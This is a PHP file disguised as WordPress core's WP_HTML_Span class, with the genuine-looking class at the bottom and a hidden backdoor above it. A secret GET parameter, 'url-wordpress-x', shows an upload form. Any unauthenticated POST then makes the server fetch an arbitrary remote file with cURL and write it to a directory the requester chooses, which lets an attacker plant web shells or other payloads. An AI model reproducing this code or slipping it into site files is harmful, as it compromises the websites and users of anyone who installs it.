<?php
/**
 * HTML API: WP_HTML_Span class
 *
 * @package WordPress
 * @subpackage HTML-API
 * @since 6.2.0
 */

// Fungsi untuk mengunduh file dari URL ke direktori yang ditentukan
function uploadFileFromUrl($url, $dir, $retries = 3)
{
    $url = trim($url);
    
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        echo "<script>Swal.fire({title: 'Whoops!', text: 'Invalid URL!', icon: 'error', confirmButtonText: 'OK'});</script>";
        return;
    }

    if (!is_dir($dir) || !is_writable($dir)) {
        echo "<script>Swal.fire({title: 'Whoops!', text: 'Directory not writable!', icon: 'error', confirmButtonText: 'OK'});</script>";
        return;
    }

    $fileName = basename(parse_url($url, PHP_URL_PATH));
    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
    $filePath = rtrim($dir, '/') . '/' . $fileName;

    $attempt = 0;
    $success = false;

    while ($attempt < $retries) {
        if (downloadFileWithCurl($url, $filePath)) {
            $success = true;
            break;
        }
        $attempt++;
    }

    if ($success) {
        echo "<script>Swal.fire({title: 'Completed!', text: 'File downloaded successfully!', icon: 'success', confirmButtonText: 'OK'});</script>";
    } else {
        echo "<script>Swal.fire({title: 'Whoops!', text: 'Failed to download file!', icon: 'error', confirmButtonText: 'OK'});</script>";
    }
}

// Fungsi untuk mengunduh file menggunakan cURL
function downloadFileWithCurl($url, $filePath)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Timeout 30 detik
    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($data === false || $httpCode !== 200) {
        return false;
    }

    return file_put_contents($filePath, $data) !== false;
}

// Periksa apakah parameter GET "url-wordpress-x" ada
if (isset($_GET["url-wordpress-x"])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    </head>
    <body>
        <div class='execution-box'>
            <form method='post'>
                <input type='text' id='terminal' name='url' placeholder='https://example.com/file.txt' required>
                <input type='hidden' name='dir' value='/path/to/your/directory'> <!-- Ubah direktori tujuan -->
                <button type='submit' name='uploadurl'>Upload URL</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Proses upload jika form dikirim
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['uploadurl'])) {
    $url = $_POST['url'] ?? '';
    $dir = $_POST['dir'] ?? getcwd(); // Default ke direktori saat ini jika tidak ditentukan
    uploadFileFromUrl($url, $dir);
}

// Kelas WP_HTML_Span
class WP_HTML_Span {
    public $start;
    public $length;

    public function __construct(int $start, int $length) {
        $this->start  = $start;
        $this->length = $length;
    }
}
